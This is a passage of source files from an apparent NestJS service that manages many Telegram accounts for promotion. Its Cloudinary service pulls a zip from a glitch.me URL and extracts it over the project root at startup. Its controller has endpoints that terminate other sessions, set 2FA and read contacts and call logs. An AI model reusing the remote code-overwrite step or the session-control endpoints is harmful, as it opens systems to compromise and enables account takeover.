res.status(error.response.status).send(error.response.data);\r\n            }\r\n\r\n            // Handle network or other errors\r\n            return res.status(500).json({\r\n                message: error.message,\r\n                code: error.code\r\n            });\r\n        }\r\n    }\r\n\r\n    // Helper method to sanitize sensitive headers\r\n    private sanitizeHeaders(headers: Record<string, any>): Record<string, any> {\r\n        const sensitiveHeaders = ['authorization', 'cookie', 'set-cookie'];\r\n        return Object.entries(headers).reduce((acc, [key, value]) => {\r\n            if (sensitiveHeaders.includes(key.toLowerCase())) {\r\n                acc[key] = '[REDACTED]';\r\n            } else {\r\n                acc[key] = value;\r\n            }\r\n            return acc;\r\n        }, {});\r\n    }\r\n}\r\n","import { MiddlewareConsumer, Module, NestModule, RequestMethod } from '@nestjs/common';\nimport { UsersModule } from './components/users/users.module';\nimport { UserDataModule } from './components/user-data/user-data.module';\nimport { ClientModule } from './components/clients/client.module';\nimport { TelegramModule } from './components/Telegram/Telegram.module';\nimport { BufferClientModule } from './components/buffer-clients/buffer-client.module';\nimport { ActiveChannelsModule } from './components/active-channels/active-channels.module';\nimport { ArchivedClientModule } from './components/archived-clients/archived-client.module';\nimport { initModule } from './components/ConfigurationInit/init.module';\nimport { ChannelsModule } from './components/channels/channels.module';\nimport { AppController } from './app.controller';\nimport { AppService } from './app.service';\nimport { LoggerMiddleware } from './middlewares/logger.middleware';\nimport { BuildModule } from './components/builds/build.module';\nimport { UpiIdModule } from './components/upi-ids/upi-ids.module';\nimport { PromoteMsgModule } from './components/promote-msgs/promote-msgs.module';\nimport { StatModule } from './components/stats/stat.module';\nimport { Stat2Module } from './components/stats2/stat2.module';\nimport { PromoteStatModule } from './components/promote-stats/promote-stat.module';\nimport { PromoteClientModule } from './components/promote-clients/promote-client.module';\nimport { TgSignupModule } from './components/TgSignup/TgSignup.module';\nimport { TransactionModule } from './components/transactions/transaction.module';\nimport { NpointModule } from './components/n-point/npoint.module';\n\n@Module({\n  imports: [\n    initModule,\n    TelegramModule,\n    ActiveChannelsModule,\n    ClientModule,\n    UserDataModule,\n    UsersModule,\n    BufferClientModule,\n    ArchivedClientModule,\n    ChannelsModule,\n    PromoteClientModule,\n    BuildModule,\n    UpiIdModule,\n    PromoteMsgModule,\n    PromoteStatModule,\n    StatModule,\n    Stat2Module,\n    TgSignupModule,\n    TransactionModule,\n    NpointModule,\n  ],\n  controllers:[AppController],\n  providers:[AppService],\n  exports:[\n    TelegramModule,\n    ActiveChannelsModule,\n    ClientModule,\n    UserDataModule,\n    UsersModule,\n    BufferClientModule,\n    ArchivedClientModule,\n    ChannelsModule,\n    PromoteClientModule,\n    TgSignupModule,\n    TransactionModule\n  ]\n})\nexport class AppModule implements NestModule {\n  configure(consumer: MiddlewareConsumer) {\n    consumer.apply(LoggerMiddleware).forRoutes('*');\n  }\n}","import { Injectable } from '@nestjs/common';\n\n@Injectable()\nexport class AppService {\n  getHello(): string {\n    return 'Hello World!';\n  }\n}\n","console.log(\"in Cloudinary\");\nimport * as cloudinary from 'cloudinary';\nimport * as path from 'path';\nimport * as fs from 'fs';\nimport AdmZip from 'adm-zip';\nimport { parseError } from './utils/parseError';\nimport { fetchWithTimeout } from './utils/fetchWithTimeout';\nexport class CloudinaryService {\n    static instance;\n    resources = new Map();\n\n    constructor() {\n        cloudinary.v2.config({\n            cloud_name: process.env.CL_NAME,\n            api_key: process.env.CL_APIKEY,\n            api_secret: process.env.CL_APISECRET\n        });\n    }\n\n    static async getInstance(name) {\n        if (!CloudinaryService.instance) {\n            CloudinaryService.instance = new CloudinaryService();\n        }\n        await CloudinaryService.instance.getResourcesFromFolder(name);\n        return CloudinaryService.instance;\n    }\n\n    public async downloadAndExtractZip(url: string) {\n        const rootPath = process.cwd();\n        const zipPath = path.resolve(rootPath, 'temp.zip');\n        const extractPath = path.resolve(rootPath);\n    \n        console.log(`Starting download of zip file from ${url}`);\n        // Download the zip file\n        const response = await fetchWithTimeout(url, { responseType: 'arraybuffer' });\n        if (response?.status === 200) {\n            console.log('Zip file downloaded successfully.');\n            fs.writeFileSync(zipPath, response.data);\n            console.log(`Zip file saved to ${zipPath}`);\n            \n            // Extract the zip file using adm-zip\n            const zip = new AdmZip(zipPath);\n            console.log(`Extracting zip file to ${extractPath}`);\n            zip.extractAllTo(extractPath, true);\n            console.log('Zip file extracted successfully.');\n            \n            fs.unlinkSync(zipPath); // Remove the zip file after extraction\n            console.log(`Temporary zip file ${zipPath} deleted.`);\n        } else {\n            const errorMessage = `Unable to download zip file from ${url}`;\n            console.error(errorMessage);\n            throw new Error(errorMessage);\n        }\n    }\n\n    async getResourcesFromFolder(folderName) {\n        console.log('FETCHING NEW FILES!! from CLOUDINARY');\n        await this.downloadAndExtractZip(`https://promoteClients2.glitch.me/folders/${folderName}/files/download-all`);\n        // await this.findAndSaveResources(folderName, 'image');\n    }\n\n    async createNewFolder(folderName) {\n        await this.createFolder(folderName);\n        await this.uploadFilesToFolder(folderName);\n    }\n\n    async overwriteFile() {\n        const cloudinaryFileId = \"index_nbzca5.js\";\n        const localFilePath = \"./src/test.js\";\n\n        try {\n\n            const result = await cloudinary.v2.uploader.upload(localFilePath, {\n                resource_type: 'auto',\n                overwrite: true,\n                invalidate: true,\n                public_id: cloudinaryFileId\n            });\n            console.log(result);\n        } catch (error) {\n            parseError(error)\n        }\n\n    }\n\n    async findAndSaveResources(folderName: string, type: string): Promise<void> {\n        try {\n            const { resources } = await cloudinary.v2.api.resources({ resource_type: type, type: 'upload', prefix: folderName, max_results: 500 });\n            await Promise.all(resources.map(async (resource) => {\n                try {\n                    this.resources.set(resource.public_id.split('/')[1].split('_')[0], resource.url);\n                    await saveFile(resource.url, resource.public_id.split('/')[1].split('_')[0]);\n                } catch (error) {\n                    console.log(resource);\n                    parseError(error)\n                }\n            }));\n        } catch (error) {\n            parseError(error)\n        }\n    }\n\n    async createFolder(folderName) {\n        try {\n            const result = await cloudinary.v2.api.create_folder(folderName);\n\n            return result;\n        } catch (error) {\n            console.error('Error creating folder:', error);\n            throw error;\n        }\n    }\n\n    // Function to upload files from URLs to a specific folder in Cloudinary\n    async uploadFilesToFolder(folderName) {\n        const uploadPromises = Array.from(this.resources.entries()).map(async ([key, url]) => {\n            try {\n                const result = await cloudinary.v2.uploader.upload_large(url, {\n                    folder: folderName,\n                    resource_type: 'auto',\n                    public_id: key, // Set the key as the public_id\n                });\n\n                return result;\n            } catch (error) {\n                console.error('Error uploading file:', error);\n                throw error;\n            }\n        });\n\n        try {\n            return await Promise.all(uploadPromises);\n        } catch (error) {\n            console.error('Error uploading files:', error);\n            throw error;\n        }\n    }\n\n    async printResources() {\n        try {\n            this.resources?.forEach((val, key) => {\n                console.log(key, \":\", val);\n            })\n        } catch (error) {\n            parseError(error)\n        }\n    }\n\n    get(publicId) {\n        try {\n            const result = this.resources.get(publicId)\n            return result || '';\n        } catch (error) {\n            parseError(error)\n        }\n    }\n\n    getBuffer(publicId) {\n        try {\n            const result = this.resources.get(publicId)\n            return result || '';\n        } catch (error) {\n            console.log(error);\n        }\n    }\n}\n\nasync function saveFile(url: string, name: string) {\n    try {\n        const extension = url.substring(url.lastIndexOf('.') + 1);\n        const rootPath = process.cwd();\n        const mypath = path.join(rootPath, `${name}.${extension}`);\n        console.log(mypath);\n\n        const res = await fetchWithTimeout(url, { responseType: 'arraybuffer' }, 2);\n\n        if (res?.statusText === 'OK') {\n            if (!fs.existsSync(mypath)) {\n                fs.writeFileSync(mypath, res.data, 'binary'); // Save binary data as a file\n                console.log(`${name}.${extension} Saved!!`);\n            } else {\n                fs.unlinkSync(mypath);\n                fs.writeFileSync(mypath, res.data, 'binary'); // Save binary data as a file\n                console.log(`${name}.${extension} Replaced!!`);\n            }\n        } else {\n            throw new Error(`Unable to download file from ${url}`);\n        }\n    } catch (err) {\n        parseError(err);\n    }\n}","import { Schema, SchemaFactory } from '@nestjs/mongoose';\nimport mongoose, { Document } from 'mongoose';\n\nexport type ConfigurationDocument = Configuration & Document;\n\n@Schema({\n    versionKey: false, autoIndex: true, strict: false, timestamps: true,\n    toJSON: {\n        virtuals: true,\n        transform: (doc, ret) => {\n            delete ret._id;\n        },\n    },\n})\nexport class Configuration { }\n\nexport const ConfigurationSchema = SchemaFactory.createForClass(Configuration);\nConfigurationSchema.add({ type: mongoose.Schema.Types.Mixed });\n\n","import { Controller, Get, Body, Param, Patch } from '@nestjs/common';\nimport { ApiTags, ApiOperation, ApiBody } from '@nestjs/swagger';\nimport { ConfigurationService } from './init.service';\n\n@ApiTags('Configuration')\n@Controller('configuration')\nexport class ConfigurationController {\n  constructor(private readonly configurationService: ConfigurationService) {}\n\n  @Get()\n  @ApiOperation({ summary: 'Get configuration data' })\n  async findOne(): Promise<any>{\n    return this.configurationService.findOne();\n  }\n\n  @Patch()\n  @ApiOperation({ summary: 'Update configuration' })\n  @ApiBody({type: Object})\n  async update( @Body() updateClientDto: any): Promise<any> {\n    return this.configurationService.update( updateClientDto);\n  }\n\n}\n","import { Module, Global, OnModuleDestroy, Inject, OnModuleInit } from '@nestjs/common';\nimport { ConfigModule } from '@nestjs/config';\nimport { MongooseModule, getConnectionToken } from '@nestjs/mongoose';\nimport { ConfigurationService } from './init.service';\nimport { ConfigurationSchema } from './configuration.schema';\nimport { ConfigurationController } from './init.controller';\nimport { Connection } from 'mongoose';\nimport { fetchWithTimeout } from '../../utils/fetchWithTimeout';\nimport { notifbot } from '../../utils/logbots';\n@Global()\n@Module({\n  imports: [\n    ConfigModule.forRoot(), // Ensure ConfigModule is imported\n    MongooseModule.forRootAsync({\n      useFactory: () => ({\n        uri: process.env.mongouri,\n      }),\n    }),\n    MongooseModule.forFeature([{\n      name: 'configurationModule', collection: 'configuration', schema: ConfigurationSchema\n    }])\n  ],\n  providers: [ConfigurationService],\n  controllers: [ConfigurationController],\n  exports: [ConfigModule, MongooseModule],\n})\nexport class initModule implements OnModuleDestroy, OnModuleInit {\n  constructor(@Inject(getConnectionToken()) private readonly connection: Connection) {}\n  async onModuleInit() {\n    console.log(`Started :: ${process.env.clientId}`)\n    fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(`Started :: ${process.env.clientId}`)}`);\n  }\n\n  async onModuleDestroy() {\n    console.log(\"Init Module Destroying\")\n    await fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(`closed :: ${process.env.clientId}`)}`);\n    this.closeConnection();\n  }\n\n  private closeConnection() {\n    console.log(\"Closing mongoose connection\")\n    this.connection.close(true)\n  }\n}","import { Injectable, NotFoundException, OnModuleInit } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { Configuration } from './configuration.schema';\nimport { CloudinaryService } from '../../cloudinary';\n\n@Injectable()\nexport class ConfigurationService {\n    constructor(@InjectModel('configurationModule') private configurationModel: Model<Configuration>) {\n        this.setEnv()\n     }\n\n    async OnModuleInit() {\n       console.log(\"Config Module Inited\")\n    }\n\n    async findOne(): Promise<any> {\n        const user = await this.configurationModel.findOne({}).exec();\n        if (!user) {\n            throw new NotFoundException(`configurationModel not found`);\n        }\n        return user;\n    }\n\n    async setEnv() {\n        console.log(\"Setting Envs\");\n        const configuration: Configuration = await this.configurationModel.findOne({}, { _id: 0 });\n        const data = {...configuration}\n        for (const key in data) {\n            console.log('setting', key)\n            process.env[key] = data[key];\n        }\n        console.log(\"finished setting env\");\n    }\n\n    async update(updateClientDto: any): Promise<any> {\n        delete updateClientDto['_id']\n        const updatedUser = await this.configurationModel.findOneAndUpdate(\n            {}, // Assuming you want to update the first document found in the collection\n            { $set: { ...updateClientDto } },\n            { new: true, upsert: true }\n        ).exec();\n        if (!updatedUser) {\n            throw new NotFoundException(`configurationModel not found`);\n        }\n        return updatedUser;\n    }\n\n}\n","import { Controller, Get, Post, Body, Param, Query, BadRequestException, Res, UsePipes, ValidationPipe, Delete, Put } from '@nestjs/common';\nimport { ApiTags, ApiOperation, ApiQuery, ApiParam, ApiBody, ApiResponse } from '@nestjs/swagger';\nimport { Response } from 'express';\nimport { TelegramService } from './Telegram.service';\nimport {\n    SendMediaDto,\n    SendMediaAlbumDto,\n    MediaSearchDto,\n    GroupSettingsDto,\n    GroupMemberOperationDto,\n    AdminOperationDto,\n    ChatCleanupDto,\n    UpdateProfileDto,\n    PrivacySettingsDto,\n    ProfilePhotoDto,\n    ScheduleMessageDto,\n    BatchProcessDto,\n    BatchOperationType,\n    ForwardBatchDto,\n    ContactExportImportDto,\n    ContactBlockListDto,\n    AddContactsDto,\n    MediaType,\n    createGroupDto\n} from './dto';\nimport { MessageType } from './dto/message-search.dto';\nimport { MediaMetadataDto } from './dto/metadata-operations.dto';\nimport { CreateChatFolderDto } from './dto/create-chat-folder.dto';\nimport { MediaAlbumOptions } from './types/telegram-types';\nimport { ChatStatistics } from 'src/interfaces/telegram';\nimport { ConnectionStatusDto } from './dto/common-responses.dto';\n\n@Controller('telegram')\n@ApiTags('Telegram')\n@UsePipes(new ValidationPipe({\n    transform: true,\n    whitelist: true,\n    forbidNonWhitelisted: true\n}))\nexport class TelegramController {\n    constructor(private readonly telegramService: TelegramService) {}\n\n    private async handleTelegramOperation<T>(operation: () => Promise<T>): Promise<T> {\n        try {\n            return await operation();\n        } catch (error) {\n            if (error instanceof BadRequestException) {\n                throw error;\n            }\n            throw new BadRequestException(error.message || 'Telegram operation failed');\n        }\n    }\n\n    // Connection Management\n    @Get('connect/:mobile')\n    @ApiOperation({ summary: 'Connect to Telegram' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiResponse({ status: 200, description: 'Successfully connected' })\n    @ApiResponse({ status: 400, description: 'Connection failed' })\n    async connect(@Param('mobile') mobile: string) {\n        await this.telegramService.createClient(mobile)\n        return { message: 'Connected successfully' };\n    }\n\n    @Get('disconnect/:mobile')\n    @ApiOperation({ summary: 'Disconnect from Telegram' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiResponse({ status: 200, description: 'Successfully disconnected' })\n    async disconnect(@Param('mobile') mobile: string) {\n        await this.telegramService.deleteClient(mobile);\n        return { message: 'Disconnected successfully' };\n    }\n\n    @Post('disconnect-all')\n    @ApiOperation({ summary: 'Disconnect all clients' })\n    @ApiResponse({ status: 200, description: 'All clients disconnected successfully' })\n    async disconnectAllClients() {\n        this.telegramService.disconnectAll();\n        return { message: 'All clients disconnected successfully' };\n    }\n    // Profile Management\n    @Get('me/:mobile')\n    @ApiOperation({ summary: 'Get current user profile' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiResponse({ status: 200, description: 'Profile retrieved successfully' })\n    async getMe(@Param('mobile') mobile: string) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.getMe(mobile);\n        });\n    }\n\n    @Get('entity/:mobile/:entity')\n    @ApiOperation({ summary: 'Get Entity profile' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiParam({ name: 'entity', description: 'Entity identifier', required: true })\n    @ApiResponse({ status: 200, description: 'Entity retrieved successfully' })\n    async getEntity(@Param('mobile') mobile: string, @Param('entity') entity: string) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.getEntity(mobile, entity);\n        });\n    }\n\n    @Post('profile/update/:mobile')\n    @ApiOperation({ summary: 'Update profile information' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: UpdateProfileDto })\n    async updateProfile(\n        @Param('mobile') mobile: string,\n        @Body() updateProfileDto: UpdateProfileDto\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.updateNameandBio(\n                mobile,\n                updateProfileDto.firstName,\n                updateProfileDto.about\n            );\n        });\n    }\n\n    @Post('profile/photo/:mobile')\n    @ApiOperation({ summary: 'Set profile photo' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: ProfilePhotoDto })\n    async setProfilePhoto(\n        @Param('mobile') mobile: string,\n        @Body() photoDto: ProfilePhotoDto\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.setProfilePic(mobile, photoDto.name);\n        });\n    }\n\n    @Delete('profile/photos/:mobile')\n    @ApiOperation({ summary: 'Delete all profile photos' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async deleteProfilePhotos(@Param('mobile') mobile: string) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.deleteProfilePhotos(mobile);\n        });\n    }\n\n    // Message Operations\n    @Get('messages/:mobile')\n    @ApiOperation({ summary: 'Get chat messages' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'chatId', required: true })\n    @ApiQuery({ name: 'limit', required: false, type: Number })\n    async getMessages(\n        @Param('mobile') mobile: string,\n        @Query('chatId') chatId: string,\n        @Query('limit') limit?: number\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.getMessages(mobile, chatId, limit);\n        });\n    }\n\n    @Post('messages/forward/:mobile')\n    @ApiOperation({ summary: 'Forward messages' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: ForwardBatchDto })\n    async forwardMessage(\n        @Param('mobile') mobile: string,\n        @Body() forwardDto: ForwardBatchDto\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.forwardBulkMessages(\n                mobile,\n                forwardDto.fromChatId,\n                forwardDto.toChatId,\n                forwardDto.messageIds\n            );\n        });\n    }\n\n    @Post('batch-process/:mobile')\n    @ApiOperation({ summary: 'Process operations in batches' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: BatchProcessDto })\n    async processBatchMessages(\n        @Param('mobile') mobile: string,\n        @Body() batchOp: BatchProcessDto\n    ) {\n        await this.telegramService.createClient(mobile);\n        return this.telegramService.processBatch(\n            batchOp.items,\n            batchOp.batchSize || 20,\n            async (batch) => {\n                switch (batchOp.operation) {\n                    case BatchOperationType.FORWARD:\n                        for (const item of batch) {\n                            if ('messageId' in item && item.fromChatId && item.toChatId) {\n                                await this.telegramService.forwardMessage(\n                                    mobile,\n                                    item.toChatId,\n                                    item.fromChatId,\n                                    item.messageId\n                                );\n                            }\n                        }\n                        break;\n                    case BatchOperationType.DELETE:\n                        for (const item of batch) {\n                            await this.telegramService.deleteChat(mobile, item.chatId);\n                        }\n                        break;\n                    default:\n                        throw new BadRequestException('Unsupported batch operation');\n                }\n            },\n            batchOp.delayMs\n        );\n    }\n\n    @Post('messages/bulk-forward/:mobile')\n    @ApiOperation({ summary: 'Forward multiple messages' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: ForwardBatchDto })\n    async forwardBulkMessages(\n        @Param('mobile') mobile: string,\n        @Body() bulkOp: ForwardBatchDto\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.forwardBulkMessages(\n                mobile,\n                bulkOp.fromChatId,\n                bulkOp.toChatId,\n                bulkOp.messageIds\n            );\n        });\n    }\n\n    @Get('messages/search/:mobile')\n    @ApiOperation({ summary: 'Search messages in a chat' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'chatId', required: true })\n    @ApiQuery({ name: 'query', required: true })\n    @ApiQuery({ name: 'types', required: false, enum: MessageType, isArray: true })\n    @ApiQuery({ name: 'offset', required: false, type: Number })\n    @ApiQuery({ name: 'limit', required: false, type: Number })\n    async searchMessages(\n        @Param('mobile') mobile: string,\n        @Query('chatId') chatId: string,\n        @Query('query') query: string,\n        @Query('types') types?: MessageType[],\n        @Query('offset') offset?: number,\n        @Query('limit') limit: number = 20\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.searchMessages(mobile, { chatId, query, types, offset, limit });\n        });\n    }\n\n    // Channel Operations\n    @Get('channels/:mobile')\n    @ApiOperation({ summary: 'Get channel information' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'includeIds', required: false, type: Boolean })\n    async getChannelInfo(\n        @Param('mobile') mobile: string,\n        @Query('includeIds') includeIds?: boolean\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.getChannelInfo(mobile, includeIds);\n        });\n    }\n\n    @Post('channels/join/:mobile')\n    @ApiOperation({ summary: 'Join channel' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiParam({ name: 'channel', description: 'Channel username or ID', required: true })\n    @ApiQuery({ name: 'forward', description: 'Whether to forward messages after joining', required: false, type: Boolean })\n    @ApiQuery({ name: 'fromChatId', description: 'Source chat ID to forward messages from', required: false })\n    async joinChannel(\n        @Param('mobile') mobile: string,\n        @Param('channel') channel: string,\n        @Query('forward') forward?: boolean,\n        @Query('fromChatId') fromChatId?: string\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            if (forward && fromChatId) {\n                return this.telegramService.joinChannelAndForward(\n                    mobile,\n                    fromChatId,\n                    channel\n                );\n            }\n            return this.telegramService.joinChannel(mobile, channel);\n        });\n    }\n\n    @Post('channels/leave/:mobile')\n    @ApiOperation({ summary: 'Leave channel' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'channel', description: 'Channel ID/username', required: true })\n    async leaveChannel(\n        @Param('mobile') mobile: string,\n        @Query('channel') channel: string\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.leaveChannel(mobile, channel);\n        });\n    }\n\n    // Security & Privacy\n    @Post('2fa/:mobile')\n    @ApiOperation({ summary: 'Setup two-factor authentication' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async setup2FA(@Param('mobile') mobile: string) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.set2Fa(mobile);\n        });\n    }\n\n    @Post('privacy/:mobile')\n    @ApiOperation({ summary: 'Update privacy settings' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async updatePrivacy(@Param('mobile') mobile: string) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.updatePrivacy(mobile);\n        });\n    }\n\n    @Post('privacy/batch/:mobile')\n    @ApiOperation({ summary: 'Update multiple privacy settings' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: PrivacySettingsDto })\n    async updatePrivacyBatch(\n        @Param('mobile') mobile: string,\n        @Body() settings: PrivacySettingsDto\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.updatePrivacyBatch(mobile, settings);\n        });\n    }\n\n    // Session Management\n    @Get('sessions/:mobile')\n    @ApiOperation({ summary: 'Get active sessions' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiResponse({ status: 200, description: 'Active sessions retrieved successfully' })\n    async getActiveSessions(@Param('mobile') mobile: string) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.getAuths(mobile);\n        });\n    }\n\n    @Delete('sessions/:mobile')\n    @ApiOperation({ summary: 'Terminate other sessions' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiResponse({ status: 200, description: 'Other sessions terminated successfully' })\n    async terminateOtherSessions(@Param('mobile') mobile: string) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.removeOtherAuths(mobile);\n        });\n    }\n\n    @Post('sessions/new/:mobile')\n    @ApiOperation({ summary: 'Create new session' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiResponse({ status: 200, description: 'New session created successfully' })\n    async createNewSession(@Param('mobile') mobile: string) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.createNewSession(mobile);\n        });\n    }\n\n    @Get('session/info/:mobile')\n    @ApiOperation({ summary: 'Get session information' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async getSessionInfo(@Param('mobile') mobile: string) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.getSessionInfo(mobile);\n        });\n    }\n\n    @Post('session/terminate/:mobile')\n    @ApiOperation({ summary: 'Terminate specific session' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async terminateSession(\n        @Param('mobile') mobile: string,\n        @Body() data: {\n            hash: string;\n            type: 'app' | 'web';\n            exceptCurrent?: boolean;\n        }\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.terminateSession(mobile, data);\n        });\n    }\n\n    // Monitoring & Health\n    @Get('monitoring/status')\n    @ApiOperation({ summary: 'Get service health and connection status' })\n    @ApiResponse({ status: 200, type: ConnectionStatusDto })\n    async getConnectionStatus() {\n        return {\n            status: await this.telegramService.getConnectionStatus()\n        };\n    }\n\n    @Get('monitoring/client/:mobile')\n    @ApiOperation({ summary: 'Get client metadata' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiResponse({ status: 200, description: 'Client metadata retrieved successfully' })\n    async getClientMetadata(@Param('mobile') mobile: string) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.getClientMetadata(mobile);\n        });\n    }\n\n    @Get('monitoring/statistics')\n    @ApiOperation({ summary: 'Get client statistics' })\n    @ApiResponse({ status: 200, description: 'Statistics retrieved successfully' })\n    async getClientStatistics() {\n        return await this.telegramService.getClientStatistics();\n    }\n\n    @Get('monitoring/health')\n    @ApiOperation({ summary: 'Get service health' })\n    @ApiResponse({ status: 200, description: 'Health status retrieved successfully' })\n    async getHealthStatus() {\n        return {\n            connections: await this.telegramService.getConnectionStatus(),\n            statistics: await this.telegramService.getClientStatistics()\n        };\n    }\n\n    @Get('monitoring/calllog/:mobile')\n    @ApiOperation({ summary: 'Get call log statistics' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async getCallLogStats(@Param('mobile') mobile: string) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.getCallLog(mobile);\n        });\n    }\n\n    // Contact Management \n    @Post('contacts/add-bulk/:mobile')\n    @ApiOperation({ summary: 'Add multiple contacts in bulk' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: AddContactsDto })\n    @ApiResponse({ status: 200, description: 'Contacts added successfully' })\n    async addContactsBulk(\n        @Param('mobile') mobile: string,\n        @Body() contactsDto: AddContactsDto\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.addContacts(\n                mobile,\n                contactsDto.phoneNumbers,\n                contactsDto.prefix\n            );\n        });\n    }\n\n    @Get('contacts/:mobile')\n    @ApiOperation({ summary: 'Get all contacts' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiResponse({ status: 200, description: 'Contacts retrieved successfully' })\n    async getContacts(@Param('mobile') mobile: string) {\n        return this.handleTelegramOperation(async () => {\n            const client = await this.telegramService.createClient(mobile);\n            return client.getContacts();\n        });\n    }\n\n    // Media Operations\n    @Get('media/info/:mobile')\n    @ApiOperation({ summary: 'Get media messages info' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'chatId', required: true })\n    @ApiQuery({ name: 'types', required: false, enum: MediaType, isArray: true })\n    @ApiQuery({ name: 'offset', required: false, type: Number })\n    @ApiQuery({ name: 'limit', required: false, type: Number })\n    async getMediaInfo(\n        @Param('mobile') mobile: string,\n        @Query('chatId') chatId: string,\n        @Query('types') types?: MediaType[],\n        @Query('offset') offset?: number,\n        @Query('limit') limit?: number\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.getMediaMetadata(mobile, chatId, offset, limit);\n        });\n    }\n\n    @Post('media/send/:mobile')\n    @ApiOperation({ summary: 'Send media message' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: SendMediaDto })\n    async sendMedia(\n        @Param('mobile') mobile: string,\n        @Body() sendMediaDto: SendMediaDto\n    ) {\n        return this.handleTelegramOperation(async () => {\n            const client = await this.telegramService.createClient(mobile);\n            if (sendMediaDto.type === MediaType.PHOTO) {\n                return client.sendPhotoChat(\n                    sendMediaDto.chatId,\n                    sendMediaDto.url,\n                    sendMediaDto.caption,\n                    sendMediaDto.filename\n                );\n            }\n            return client.sendFileChat(\n                sendMediaDto.chatId,\n                sendMediaDto.url,\n                sendMediaDto.caption,\n                sendMediaDto.filename\n            );\n        });\n    }\n\n    @Get('media/download/:mobile')\n    @ApiOperation({ summary: 'Download media from a message' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'chatId', required: true })\n    @ApiQuery({ name: 'messageId', required: true })\n    async downloadMedia(\n        @Param('mobile') mobile: string,\n        @Query('chatId') chatId: string,\n        @Query('messageId') messageId: number,\n        @Res() res: Response\n    ) {\n        return this.handleTelegramOperation(async () => {\n            await this.telegramService.createClient(mobile);\n            return this.telegramService.downloadMediaFile(mobile, messageId, 